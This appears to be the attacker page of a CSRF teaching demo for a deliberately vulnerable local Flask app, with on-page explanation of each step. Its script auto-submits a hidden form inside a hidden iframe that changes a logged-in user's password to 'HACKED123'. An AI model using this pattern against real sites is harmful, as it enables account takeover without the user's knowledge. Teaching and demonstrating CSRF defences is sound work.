<!DOCTYPE html>
<html lang="en" data-bs-theme="dark">
<head>
    <meta charset="UTF-8">
    <title>Malicious CSRF Attack Site</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
</head>
<body data-bs-theme="dark">
<div class="container mt-5">
    <div class="card border-warning">
        <div class="card-header bg-warning text-dark">
            <h4 class="mb-0"><i class="bi bi-exclamation-triangle-fill"></i> Malicious CSRF Attack Page</h4>
        </div>
        <div class="card-body">
            <div class="alert alert-warning">
                <h5><i class="bi bi-bug-fill"></i> CSRF Attack in Progress...</h5>
                <p class="mb-0">
                    This page is attempting to change your password without your knowledge!
                    If you're logged into the vulnerable endpoint, your password will be changed to "HACKED123".
                </p>
            </div>

            <div id="spinner" class="text-center my-4">
                <div class="spinner-border text-danger" role="status">
                    <span class="visually-hidden">Loading...</span>
                </div>
                <p class="mt-3">Submitting malicious form automatically...</p>
            </div>

            <div id="result"></div>

            <hr>

            <h6>What's happening:</h6>
            <ol>
                <li>This page loads while you're logged into the vulnerable app</li>
                <li>JavaScript automatically submits a hidden form</li>
                <li>Your browser sends your session cookie automatically</li>
                <li>The server thinks it's YOU making the request</li>
                <li>Your password gets changed to "HACKED123"</li>
            </ol>

            <div class="alert alert-info mt-3">
                <strong>Check your Flask terminal</strong> - you'll see the password change logged!
            </div>

            <a href="/" class="btn btn-primary">Back to Home</a>
        </div>
    </div>
</div>

<!-- Hidden form that auto-submits to change password -->
<iframe name="csrf_frame" style="display:none;"></iframe>
<form id="csrf_form" method="post" action="/change_password_vuln" target="csrf_frame" style="display:none;">
    <input type="hidden" name="new_password" value="HACKED123">
</form>

<script>
// Auto-submit the form after 2 seconds
setTimeout(function() {
    document.getElementById('csrf_form').submit();
    // Hide the spinner
    document.getElementById('spinner').style.display = 'none';
    // Show the result
    document.getElementById('result').innerHTML = `
        <div class="alert alert-danger">
            <h5><i class="bi bi-check-circle-fill"></i> CSRF Attack Completed!</h5>
            <p>If you were logged into the vulnerable password change page, your password has been changed to <code>HACKED123</code></p>
            <p class="mb-0">This is why CSRF protection is critical for state-changing operations!</p>
        </div>
    `;
}, 2000);
</script>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
